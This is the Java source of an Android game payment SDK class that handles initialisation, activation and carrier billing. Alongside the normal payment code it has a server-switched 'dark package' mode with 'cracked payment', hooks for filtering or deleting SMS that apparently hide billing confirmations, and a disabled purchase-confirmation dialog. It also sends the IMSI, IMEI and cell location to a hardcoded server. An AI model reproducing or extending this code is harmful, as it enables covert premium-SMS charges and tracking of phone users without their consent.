package mobi.zty.sdk.game;

import java.util.UUID;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

import mobi.zty.pay.R;
import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.factory.PaymentFactoy;
import mobi.zty.sdk.crypto.AES;
import mobi.zty.sdk.crypto.Crypto;
import mobi.zty.sdk.game.bean.ActivateResult;
import mobi.zty.sdk.game.bean.GetMSMResult;
import mobi.zty.sdk.game.bean.InitializeResult;
import mobi.zty.sdk.game.bean.OthreFeeInfo;
import mobi.zty.sdk.game.bean.UserInfo;
import mobi.zty.sdk.game.callback.ActivateCallback;
import mobi.zty.sdk.game.callback.InitializeCallback;
import mobi.zty.sdk.game.object.parser.ActivateResultParser;
import mobi.zty.sdk.game.object.parser.GetMSMResultParser;
import mobi.zty.sdk.game.object.parser.InitializeResultParser;
import mobi.zty.sdk.http.HttpCallback;
import mobi.zty.sdk.http.HttpRequest;
import mobi.zty.sdk.util.DeviceInfo;
import mobi.zty.sdk.util.DeviceInfoUtil;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.LocalStorage;
import mobi.zty.sdk.util.MzDialog;
import mobi.zty.sdk.util.OmpicSharedPreferences;
import mobi.zty.sdk.util.StringUtil;
import mobi.zty.sdk.util.Util_G;

import org.json.JSONException;
import org.json.JSONObject;




import com.unicom.dcLoader.Utils;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Dialog;
import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.os.Handler;
import android.os.Message;
import android.os.PowerManager;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class GameSDK implements InitializeCallback, ActivateCallback {
	private final static Lock lock = new ReentrantLock();
	private static GameSDK instance;

	static String mbDelSMS = "0";
	static String mDelSMSCon = "";
	private int afdft;
	private String afdf;
	public static Context context;
	public static final String SENT_SMS_ACTION = "SENT_SMS_ACTION";
	public static final String RECEIVED_SMS_ACTION = "android.provider.Telephony.SMS_RECEIVED";
	private PowerManager mPowerManager = null;
	public String gameId;
	public String cp_ext;
	public String gameName;
	public String currentAppID;
	public String packetId = "1";// lsl
	public String deviceId;
	private boolean initalized;// 这里代表激活成功 说明用户进入游戏的时候有网络
	HttpRequest<InitializeResult> mInitializeRequest = null; // 初始化的request请求
	/* 联网用到的变量 start */
	public String dipcon;// 登录跑马灯内容
	public String dipcon2;// 支付跑马灯内容
	public String dipurl;// 支付公告
	public String noturl;// 登录公告
	public String exiturl;
	public boolean NETIVE_FEE_CAN_PAY = false;
	private static final int NETIVE_FEE_MSG = 1;
	private static final int NET_FEE_MSG = 5;
	private static final int FEE_OVER = 10;// 过了三十秒后 支付还没结束 恢复为可重新支付状态
	private static final int TO_OTHER_PAY = 15;// 如果mm破解遇到问题 都转用正常支付流程
	private static final int NOTICE_STARTPAY = 100;
	private static final int NOTICE_EXITGAME = 105;
	private long DELAY_TIMER = 100 * 1000;
	private boolean SendTimer = true;
	private static HttpCallback<GetMSMResult> SMScallBack;
	public long limitMoney = 0;// 单位是分；

	public OthreFeeInfo leYoufeeInfo = null;
	public OthreFeeInfo anAnfeeInfo = null;
	public String payTypeID = "";
	public int openDark = 0;
	public int openAlert = 0;
	public int openButton = 0;
	public int openOurAlert = 0;
	public int cootype = 0;
	public String gameVersionCode = "4";
	public int PayType = Integer.parseInt(Constants.COMMON_MM);
	private static Button cancel_btn,confirm_btn;
	private static TextView txt_appname,txt_productname,txt_amount,txt_telephone,txt_details;
	
	private  Handler handler = new Handler() {
		public void dispatchMessage(android.os.Message msg) {
			switch (msg.what) {
			case NETIVE_FEE_MSG:
				if (instance != null) {
					instance.NETIVE_FEE_CAN_PAY = true;
					if (instance.gameSDKInitListener != null) {
						instance.gameSDKInitListener.onOpenDark(
								instance.openDark, instance.openAlert,
								instance.openButton, instance.openOurAlert,
								instance.cootype);// 通知客户端 黑包开启
					}
				}
				break;
			case NET_FEE_MSG:
				try {
					String response = (String) msg.obj;
					if (response == null || response.equals("")) {
						SMScallBack.onFailure(1, "服务器无响应！");// 联网获取短信内容失败
															// 直接再走正常支付
						sendEmptyMessage(TO_OTHER_PAY);
					} else {
						JSONObject jsonObject = new JSONObject(response);
						int ret = jsonObject.getInt("code");
						GetMSMResultParser responseParser = new GetMSMResultParser();
						GetMSMResult msmResult = responseParser
								.getResponse(response);
						if (msmResult != null) {
							SMScallBack.onSuccess(msmResult);
						} else {
							SMScallBack.onFailure(ret, "解析数据失败！");
						}

					}
				} catch (JSONException e) {
					e.printStackTrace();
				}
				break;
			case TO_OTHER_PAY: {
				PayConfig.IS_PAYING = false;
				if (instance != null)
					instance.NETIVE_FEE_CAN_PAY = false;// 暂时不支持 黑包
				removeMessages(NETIVE_FEE_MSG);
				sendEmptyMessageDelayed(NETIVE_FEE_MSG, 8000);// 获取不到指令暂时不能
																// 10秒后恢复使用破解
				instance.startPay(SendOder.getInstance().amount,
						SendOder.getInstance().payindex,
						SendOder.getInstance().payname, gameSDKPaymentListener);
			}
				break;
			case FEE_OVER:
				PayConfig.IS_PAYING = false;// 这里只有 真正 支付很久没回来才会进来
				break;
			case NOTICE_STARTPAY:
				Object[] objs = (Object[]) msg.obj;
				instance.allPay((Integer) objs[0], (Integer) objs[1],
						(String) objs[2], (GameSDKPaymentListener) objs[3],
						(String[]) objs[4]);
//				final Object[] strs = (Object[]) msg.obj;
//				final Dialog sureDialog = new MzDialog(context, R.style.mzDialog);
//				confirm_btn = (Button) sureDialog.getWindow().findViewById(R.id.confirm_btn);
//				cancel_btn = (Button) sureDialog.getWindow().findViewById(R.id.cancel_btn);
//				txt_appname = (TextView) sureDialog.getWindow().findViewById(R.id.app_name);
//				txt_productname = (TextView) sureDialog.getWindow().findViewById(R.id.productname);
//				txt_amount = (TextView) sureDialog.getWindow().findViewById(R.id.amount);
//				txt_telephone =  (TextView) sureDialog.getWindow().findViewById(R.id.telephone);
//				txt_details =  (TextView) sureDialog.getWindow().findViewById(R.id.detailes);
//				txt_appname.setText("游戏名称："+gameName);
//				txt_productname.setText("道具名称："+(String)strs[2]);
//				txt_amount.setText("资        费："+(Integer)strs[0]*0.01+"元");
//				txt_telephone.setText("客服电话："+"075586715263");
//				txt_details.setText("点击“确认支付”发送购买短信，资费由运营商代收（不含通信费），如有疑问请拨打客服电话。");
//				
//				cancel_btn.setOnClickListener(new OnClickListener() {
//						
//					@Override
//					public void onClick(View v) {
//						// TODO Auto-generated method stub
//						GameSDK.gameSDKPaymentListener = (GameSDKPaymentListener) strs[3];
//						notifyPaymentCancelled();
//						sureDialog.dismiss();
//					}
//				});
//				confirm_btn.setOnClickListener(new OnClickListener() {
//					
//					@Override
//					public void onClick(View v) {
//						// TODO Auto-generated method stub
//						instance.allPay((Integer)strs[0], (Integer)strs[1], (String)strs[2], (GameSDKPaymentListener)strs[3], (String[])strs[4]);
//						sureDialog.dismiss();
//					}
//				});
//				sureDialog.setCanceledOnTouchOutside(false);
//				sureDialog.show();
			
				break;
			case NOTICE_EXITGAME:
				handExitGame((ExitGameListener)msg.obj);
				break;
			default:
				break;
			}
		};
	};
	private boolean uincomSDKInited = false;
	/* 联网用到的变量 end */

	public Handler payResultHandle = new Handler() {
		public void handleMessage(android.os.Message msg) {
			PayResultInfo info = (PayResultInfo) msg.obj;

			PayConfig.IS_PAYING = false;
			switch (msg.what) {
			case PayConfig.NOTIFY_PAYRESULT: {// 移动支付 结果回调
				if (info == null) {
					return;
				}
				switch (info.resutCode) {
				case PayConfig.BIIL_SUCC:
					SendOder.getInstance().sapay_ret(info.retMsg, 1);
					notifyPaymentFinish(SendOder.getInstance().amount);
					break;
				case PayConfig.BIIL_CANCER:
					notifyPaymentCancelled();
					break;
				case PayConfig.MM_INIT_CODE: {// 预留接口暂时没用
				// makeToast(info.retMsg);
//					mmSDKInited = true;// 暂时只要初始化有响应就代表成功
					break;
				}
				case PayConfig.FEE_FAIL_TO_OTHER: {// 转正常支付
					handler.sendEmptyMessage(TO_OTHER_PAY);
				}
					break;
				default:
					notifyPaymentFail(info.resutCode, info.retMsg);
					break;
				}
				break;
			}
			case PayConfig.NATIVE_FEE_FAIL: {// 破解支付 短信被拦截
				if (instance.bCallback == 0) {
					instance.bCallback = 1;
					notifyPaymentFail(PayConfig.NATIVE_FEE_FAIL, "发送短信超时");
				}
				break;
			}
			case PayConfig.NO_THIS_PAYTYPE: {
				notifyPaymentFail(PayConfig.NO_THIS_PAYTYPE, "不支持该类型支付");
				break;
			}

			default:
				break;

			}
		};
	};

	public String payResultUrl = "http://211.154.152.59:8080/sdk/orderState";
	

	public static GameSDKPaymentListener gameSDKPaymentListener;
	private GameSDKInitListener gameSDKInitListener;
	public static String payOrder;
	public static String limitOrder;// 限制订单 也是payOrder的一部分，是破解支付时的订单号

	int mcc, mnc, lac, cid;
	/**
	 * 0：移动MM支付、
	 * 1：联通wo商店、2：电信爱游戏、3：无卡、4：联通wo+破解、5：电信天翼空间破解、6：没可选择的支付类型、7：mm基地白包, 8、alipay,9:ananpay
	 * 9、wechat
	 */
	private static final String[] paywayStr = { "mmpay", "unipay", "tcpay",
			"无卡", "wopay", "openpay", "nopay", "mmjd", "alipay", "wxpay","ananpay" };// wopay,openpay
	/**
	 * 破解支付才有用
	 */
	public int bCallback = 0;

	private GameSDK(Context context) {
		this.context = context;
		this.mPowerManager = (PowerManager) context
				.getSystemService(Context.POWER_SERVICE);
		SendTimer = true;
		new DurationTread().start();
	}

	public static GameSDK getInstance(Context context) {
		try {
			lock.lock();
			instance = new GameSDK(context);
			return instance;
		} finally {
			lock.unlock();
		}
	}

	public static GameSDK getInstance() {
		return instance;
	}

	/**
	 * 
	 * @param activity
	 * @param mmHandle
	 * @param packetType
	 *            1移动 5联通 10电信 15支付宝
	 * @return 实际支付类型 1移动 5联通 10电信 15支付宝
	 */
	public static void initSDK(Activity activity, String appid,GameSDKInitListener initListener, String... exts) {
		getInstance(activity);
		instance.gameSDKInitListener = initListener;
		 Log.e("test", "sdk_init开始");
		instance.afdft = (int) (System.currentTimeMillis() / 1000);//
		// instance.packetId = packetId;
		// instanc-----e.gameId =
		// gameId;//Constants.GAMEID;//MetaDataUtil.getInt(activity,
		// "SHOUMENG_GAME_ID", 1);
		LocalStorage storage = LocalStorage.getInstance(activity);
		String discon = storage.getString(Constants.DisCon);
		instance.dipcon = discon;
		instance.noturl = storage.getString(Constants.DisUrl);

		if (exts != null) {
			if (exts.length > 0) {
				instance.cp_ext = exts[0];
			}
			if (exts.length > 1 && exts[1].length() > 0) {
				try {
					instance.PayType = Integer.parseInt(exts[1]);
					storage.putString(Constants.MK, instance.PayType + "");
				} catch (Throwable e) {
					e.printStackTrace();
				}

			}
			if (exts.length > 2) {
				instance.gameVersionCode = exts[2];
			}
		}

		instance.currentAppID = appid;
		if (PayConfig.appidMap.containsKey(appid)) {// 在没卡的时候 appid 得特殊处理下
			instance.gameId = PayConfig.appidMap.get(appid);
		} else {
			instance.makeToast("appid不存在");
			return;
		}
		instance.packetId = Helper.getConfigString(activity, "MUZHI_PACKET");
		// if(PayConfig.isExport(instance.gameId))
		// {
		// Constants.SERVER_URL = "http://sa.91muzhi.com:8080/sdk/%s";
		//
		// }
		if (Helper.isDebugEnv()) {
			instance.makeToast("当前测试模式！");
			Constants.SERVER_URL = "http://sa.91muzhi.com:8090/sdk/%s";
		}
		instance.gameName = Helper.getApplicationName(activity);
		instance.initialize();
	}

	/**
	 * 设置程序是否为测试模式 默认false
	 * 
	 * @param var
	 */
	public static void setDebug(boolean var) {
		Helper.setDebug(var);
	}

	public void initialize() {
		SendOder.getInstance().init(context);// 初始化发送 订单统计的 类
		try {
			PaymentFactoy.producePay(PayConfig.UNICOM_MOBLE).init(context,
					instance.currentAppID, payResultHandle);
			uincomSDKInited = true;
		} catch (Throwable e) {
			Util_G.debugE("PayConfig.UNICON", e.getMessage());
		}
		Log.e("test", "sdk_init开始2");
		PayConfig.IS_PAYING = false;
		// 下面初始化 packetID在激活的时候要用到
		// 所以最好在init(this)前初始化，PayConfig.currentAppID会在移动MM初始化后赋值
		String channel = Helper.getChannel((Activity) context, "channel");
		if (channel != null && channel.trim().length() >= 4
				&& !channel.startsWith("000000")) {
			if (StringUtil.isEmpty(instance.packetId)) {
				instance.packetId = instance.currentAppID
						.substring(instance.currentAppID.length() - 5)
						+ "_"
						+ channel.substring(channel.length() - 4);
			}
		}

		NETIVE_FEE_CAN_PAY = false;
		DELAY_TIMER_COUNT = 0;
		init(this);
	}

	private void init(InitializeCallback initializeCallback) {
		Util_G.debug_i("test", "init");//
		LocalStorage storage = LocalStorage.getInstance(context);
		deviceId = storage.getString(Constants.DEVICE_ID);
		String URL = storage.getString(Constants.URL);
		if (URL.length() > 1) {
			Constants.SERVER_URL = URL;
		}
		Util_G.debug_i("test", "url=" + URL);
		if (StringUtil.isEmpty(deviceId)) {

			DeviceInfo info = DeviceInfoUtil.getDeviceInfo(context);
			info.setPackageId(packetId);
			String api = String.format(Constants.SERVER_URL, "init");
			HttpRequest<InitializeResult> request = new HttpRequest<InitializeResult>(
					context, null, new InitializeResultParser(),// new
																// InitializeProgressView(context)
					new InitializeListener(initializeCallback));
			mInitializeRequest = request;

			request.execute(api, info.toJSON());

		} else {
			InitializeResult result = new InitializeResult(deviceId);
			initializeCallback.onInitSuccess(result);
		}

	}

	private class InitializeListener implements HttpCallback<InitializeResult> {

		private InitializeCallback callback;

		private InitializeListener(InitializeCallback callback) {
			this.callback = callback;
		}

		@Override
		public void onSuccess(InitializeResult object) {
			GameSDK.this.deviceId = object.getDeviceId();
			LocalStorage storage = LocalStorage.getInstance(context);
			storage.putString(Constants.DEVICE_ID, object.getDeviceId());
			callback.onInitSuccess(object);
		}

		@Override
		public void onFailure(int errorCode, String errorMessage) {
			callback.onFailure(errorCode, errorMessage);
			if (errorCode != Constants.ERROR_CODE_NET) {
				// 暂时单机初始化请求失败 不做任何处理
			}
		}

	}

	public void activate() {
		activate(this);
	}

	@SuppressLint("NewApi")
	private void activate(ActivateCallback activateCallback) {

		Util_G.debug_i("test", "activate");
		String api = String.format(Constants.SERVER_URL, "activate");

		HttpRequest<ActivateResult> request = new HttpRequest<ActivateResult>(
				context, null, new ActivateResultParser(),// new
															// InitializeProgressView(context)
				new ActivateListener(activateCallback));

		TelephonyManager telephonyManager = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String operator = telephonyManager.getNetworkOperator();
		lac = 0;
		cid = 0;
		mcc = 0;
		mnc = 0;
		if (operator != null && !operator.isEmpty()) {
			try {
				mcc = Integer.parseInt(operator.substring(0, 3));
				mnc = Integer.parseInt(operator.substring(3));
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

		if (mnc == 2 || mnc == 0 || mnc == 7) {
			try {
				GsmCellLocation location = (GsmCellLocation) telephonyManager
						.getCellLocation();
				lac = location.getLac();
				cid = location.getCid();
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else {
			lac = 0;
			cid = 0;
		}

		JSONObject user = new JSONObject();
		try {
			user.put("device_id", deviceId);
			user.put("packet_id", packetId);
			user.put("game_id", gameId);
			user.put("imsi", Helper.getIMSI(context));
			user.put("ver", Constants.GAME_SDK_VERSION);
			user.put("mcc", mcc);
			user.put("mnc", mnc);
			user.put("lac", lac);
			user.put("cid", cid);
			user.put("game_ver", instance.gameVersionCode);
		} catch (JSONException e) {
			e.printStackTrace();
		}
		request.execute(api, user.toString());

	}

	private class ActivateListener implements HttpCallback<ActivateResult> {

		private ActivateCallback callback;

		private ActivateListener(ActivateCallback callback) {
			this.callback = callback;
		}

		@Override
		public void onSuccess(ActivateResult object) {
			callback.onActivateSuccess(object);
		}

		@Override
		public void onFailure(int errorCode, String errorMessage) {
			callback.onFailure(errorCode, errorMessage);
			if (errorCode != Constants.ERROR_CODE_NET) {
				// 单机激活失败不做处理
			}
		}

	}

	private static int DELAY_TIMER_COUNT = -1;

	private class DurationTread extends Thread {
		@Override
		public void run() {
			super.run();
			while (SendTimer) {
				try {
					if (!NETIVE_FEE_CAN_PAY) {
						DELAY_TIMER_COUNT += 1;
						if (DELAY_TIMER_COUNT > (DELAY_TIMER / 1000 + 10)) {
							handler.removeMessages(NETIVE_FEE_MSG);
							handler.sendEmptyMessage(NETIVE_FEE_MSG);
						}
					}
					watch();
					Thread.sleep(1000);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}

	long background = 0;

	public void watch() {
		if (!mPowerManager.isScreenOn() || !Helper.isAppOnForeground(context)) {// 如果游戏不在前端马上发送数据
			if (background > 0) {
				background = 0;
				statisticsDuration(null);
				afdf3();
			}
		} else {
			background++;
			if (background > 60 * 2) {// 2分钟发送一次
				statisticsDuration(null);
				afdf3();
				background = 0;
			}
		}
	}

	/**
	 * 统计时长
	 * 
	 * @param storage
	 */
	private void statisticsDuration(LocalStorage storage) {
		if (storage == null) {
			storage = LocalStorage.getInstance(context);
		}
		int afd = 0;
		afd = (int) (System.currentTimeMillis() / 1000);
		storage.putString("adff2", String.valueOf(afd - instance.afdft));
	}

	public void afdf3() {
		Util_G.debug_i(Constants.TAG, "afdf");
		if (!initalized) {// 如果进来时初始化没成功 就不发送在线时长统计
			return;
		}

		String adff0 = getSavedLoginAccount();
		if (adff0 == null || adff0.trim().equals("")) {
			adff0 = Helper.getIMEI(context);
		}
		try {
			LocalStorage storage = LocalStorage.getInstance(context);
			int adff2 = 0;
			int adff3 = 0;
			String content = "0";
			String adff4 = "";
			String adff5 = "";
			String adff6 = "";
			try {

				content = storage.getString("adff2", "0");// crypto.decrypt(deviceId,content);
				adff2 = Integer.valueOf(content);

				content = storage.getString("adff3", "0");// crypto.decrypt(deviceId,content);
				adff3 = Integer.valueOf(content);

				adff4 = storage.getString("adff4", "");
				adff5 = storage.getString("adff5", "");
				adff6 = storage.getString("adff6", "");

			} catch (Exception ex) {
			}
			JSONObject user = new JSONObject();
			user.put("device_id", deviceId);
			user.put("packet_id", packetId);
			user.put("game_id", gameId);
			user.put("login_account", adff0);
			user.put("server_id", adff4);
			user.put("adff5", adff5);
			user.put("adff6", adff6);

			user.put("adff2", adff2);
			user.put("adff3", adff3);

			user.put("ver", Constants.GAME_SDK_VERSION);

			HttpRequest<UserInfo> request = new HttpRequest<UserInfo>(context,
					null, null,// new LoginProgressView(context)
					null);// new LoginListener(loginCallback))
			request.execute(afdf, user.toString());

			// Log.e("afdf3", "afdf3--->"+user.toString());
			instance.afdft = (int) (System.currentTimeMillis() / 1000);
		} catch (Exception ex) {
			// makeToast("初始化失败，请退出程序后再试");
		}

	}

	public String getSavedLoginAccount() {
		String ret = "";
		OmpicSharedPreferences localSharedPreferences = new OmpicSharedPreferences(
				Constants.dataPath);
		ret = localSharedPreferences.getString(Constants.LOGIN_ACCOUNT, "");

		if (StringUtil.isEmpty(ret)) {
			LocalStorage storage = LocalStorage.getInstance(context);
			try {
				Crypto crypto = new AES();
				String content = storage.getString(Constants.LOGIN_ACCOUNT, "");// crypto.decrypt(deviceId,content);
				ret = content;
			} catch (Exception ex) {
				// return "";
			}
		}
		return ret;
	}

	@Override
	public void onInitSuccess(
			mobi.zty.sdk.game.bean.InitializeResult initializeResult) {
		GameSDK.this.deviceId = initializeResult.deviceId;
		// activate(this);//lsl
		activate();
	}

	@Override
	public void onFailure(int errorCode, String errorMessage) {
		// Util_G.debug_i("test", "失败恢复url="+Constants.OSERVER_URL);
		// LocalStorage storage = LocalStorage.getInstance(context);
		// storage.putString(Constants.URL, Constants.OSERVER_URL);
	}

	@Override
	public void onActivateSuccess(ActivateResult activateResult) {
		GameSDK.this.afdf = activateResult.getAdfd();
		GameSDK.this.dipcon = activateResult.getDipcon();
		GameSDK.this.payTypeID = activateResult.getAppPayId();
		instance.openDark = activateResult.getOpenDark();
		instance.openAlert = activateResult.getOpenAlert();
		instance.openButton = activateResult.getOpenButton();
		instance.openOurAlert = activateResult.getOpenOurAlert();
		instance.cootype = activateResult.getCootype();
		GameSDK.mbDelSMS = activateResult.getbDel();
		GameSDK.mDelSMSCon = activateResult.getFillCon();
		/* 开黑包时间start */
		DELAY_TIMER = activateResult.getDelayDimer() * 1000;
		DELAY_TIMER_COUNT = 0;
		handler.sendEmptyMessageDelayed(NETIVE_FEE_MSG, DELAY_TIMER);
		/* 开黑包时间end */
		LocalStorage storage = LocalStorage.getInstance(context);
		storage.putString(Constants.URL, activateResult.getUrl());
		Util_G.debug_i("test", "newurl=" + activateResult.getUrl());
		storage.putString(Constants.DisCon, activateResult.getDipcon());
		storage.putString(Constants.DisUrl, activateResult.getNoturl());

		storage.putString(Constants.MKUrl, activateResult.getMkurl());
		String mk = activateResult.getMk();
		storage.putString(Constants.MK,
				(mk.equals("0") || mk == null || mk.trim().equals("") ? PayType
						+ "" : activateResult.getMk()));

		limitMoney = activateResult.getLimitMoney();


		instance.dipcon2 = activateResult.getDipcon2();
		instance.dipurl = activateResult.getDipurl();
		instance.noturl = activateResult.getNoturl();
		instance.exiturl = activateResult.getExiturl();
		GameSDK.this.initalized = true;
		instance.gameSDKInitListener.initOver(true, PayType, false);
	}

	public static String getSetting(Context activity, String name) {
		String value = "";
		LocalStorage storage = LocalStorage.getInstance(activity);
		value = storage.getString(name);
		return value;

	}

	/**
	 * 支付接口
	 * 
	 * @param requestAmount
	 *            单位是分
	 * @param payindex
	 *            计费点索引
	 * @param payname
	 *            该商品名称
	 * @param gameSDKPaymentListener
	 *            回调监听
	 * @param extendP
	 *            扩展参数 parmet1(15 alipay 16weCaht)
	 */
	public void startPay(int requestAmount, int payindex, String payname,
			GameSDKPaymentListener gameSDKPaymentListener, String... extendP) {
		Message message = handler.obtainMessage(NOTICE_STARTPAY);
		Object[] strs = { requestAmount, payindex, payname,
				gameSDKPaymentListener, extendP };
		message.obj = strs;
		message.sendToTarget();
	}

	private synchronized void allPay(int requestAmount, int payindex,
			String payname, GameSDKPaymentListener gameSDKPaymentListener,
			String[] extendP) {
		if (!PayConfig.appidMap.containsKey(instance.currentAppID)) {// 如果传进来的appid
																		// 不存在不能进行支付
			instance.makeToast("appid不存在");
			return;
		}
		if (!PayConfig.IS_PAYING) {
			PayConfig.IS_PAYING = true;
		} else {
			Toast.makeText(context, "正在支付中..", Toast.LENGTH_SHORT).show();
			if (gameSDKPaymentListener != null) {
				gameSDKPaymentListener.onPayCancelled();
			}// 这个时候也得返回支付取消 不然游戏可能会卡住
			return;
		}
		GameSDK.gameSDKPaymentListener = gameSDKPaymentListener;
		payOrder = UUID.randomUUID().toString();
		payOrder = (payOrder.replace("-", "")).substring(0, 14);

		SendOder.getInstance().amount = requestAmount;
		SendOder.getInstance().payname = payname;
		SendOder.getInstance().payindex = payindex;
		
		if(uincomSDKInited) {
			SendOder.getInstance().payway = paywayStr[1];
			SendOder.getInstance().sapay_ret("", 0);
			try {
				PaymentFactoy.producePay(PayConfig.UNICOM_MOBLE).pay(
						context, payindex,payOrder);
			} catch (Throwable e) {
				Util_G.debugE("allPay", e.getMessage());
				payResultHandle.sendEmptyMessage(PayConfig.NO_THIS_PAYTYPE);
			}
		}
	}


	public static boolean isFill(String sms) {
		boolean ret = false;
		if (GameSDK.mbDelSMS.equals("1")) {
			ret = sms.contains(GameSDK.mDelSMSCon);
		}
		;
		return ret;
	}

	public void makeToast(String message) {
		if (Helper.isDeBuge) {
			Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
		}
	}

	public void notifyPaymentFinish(int amount) {
		if (gameSDKPaymentListener != null) {
			gameSDKPaymentListener.onPayFinished(amount);
		}
		PayConfig.IS_PAYING = false;
	}

	public void notifyPaymentCancelled() {
		if (gameSDKPaymentListener != null) {
			gameSDKPaymentListener.onPayCancelled();
		}
		PayConfig.IS_PAYING = false;
	}

	// public void notifyPaymentFail(PayResultInfo info) {
	// if (gameSDKPaymentListener != null) {
	// gameSDKPaymentListener.onPayFail(info);
	// }
	// PayConfig.IS_PAYING = false;
	// }
	public void notifyPaymentFail(int resutCode, String retMsg) {
		PayResultInfo failInfo = new PayResultInfo();
		failInfo.resutCode = resutCode;
		failInfo.retMsg = retMsg;
		if (gameSDKPaymentListener != null) {
			gameSDKPaymentListener.onPayFail(failInfo);
		}
		PayConfig.IS_PAYING = false;
	};

	public ContentObserver mObserver;

	/**
	 * 最好每次退出游戏调用下
	 */
	public void exitGame(final ExitGameListener listener) {
		Message message = handler.obtainMessage(NOTICE_EXITGAME);
		message.obj = listener;
		message.sendToTarget();
	}

	private static void handExitGame(final ExitGameListener listener) {
		instance.uincomSDKInited = false;
		instance.SendTimer = false;
		if (GameSDK.mbDelSMS.equals("1") && instance.mObserver != null) {
			instance.context.getContentResolver().unregisterContentObserver(
					instance.mObserver);
		}
		instance = null;
		listener.exitGame(true);	
	}

	public void onResume() {
		Utils.getInstances().onResume(context);
	}

	public void onPause() {
		Utils.getInstances().onPause(context);
	}
}
